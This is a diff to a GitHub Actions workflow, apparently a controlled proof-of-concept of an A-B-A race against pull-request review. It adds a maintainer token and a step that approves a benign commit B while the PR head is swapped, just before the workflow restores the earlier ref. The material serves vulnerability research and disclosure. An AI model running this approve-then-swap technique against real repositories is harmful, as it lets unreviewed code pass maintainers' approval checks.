@@ -188,6 +188,7 @@ jobs:
           SWITCH_TO_B_MS: ${{ inputs.switch_to_b_ms }}
           HOLD_B_MS: ${{ inputs.hold_b_ms }}
         with:
+          github-token: ${{ secrets.BCR_POC_PAT }}
           script: |
             const owner = context.repo.owner;
             const repo = context.repo.repo;
@@ -238,6 +239,27 @@ jobs:
               force: true,
             });
             core.notice(`PR head switched to benign B: ${benign.data.object.sha}`);
+            // Model the legitimate authorization that the vulnerable reviewer is
+            // expected to bind to B. The PR is bot-authored, so the controlled
+            // maintainer token can submit an independent approval.
+            const prs = await github.rest.pulls.list({
+              owner,
+              repo,
+              state: 'open',
+              head: `${owner}:poc/aba-race-bot`,
+            });
+            if (prs.data.length !== 1) {
+              throw new Error(`Expected one open bot PR, found ${prs.data.length}`);
+            }
+            await github.rest.pulls.createReview({
+              owner,
+              repo,
+              pull_number: prs.data[0].number,
+              commit_id: benign.data.object.sha,
+              event: 'APPROVE',
+              body: 'Controlled PoC approval of benign B before the A-B-A restoration.',
+            });
+            core.notice(`Maintainer approved benign B on PR #${prs.data[0].number}`);
 
             await sleep(holdDelay);
             await github.rest.git.updateRef({
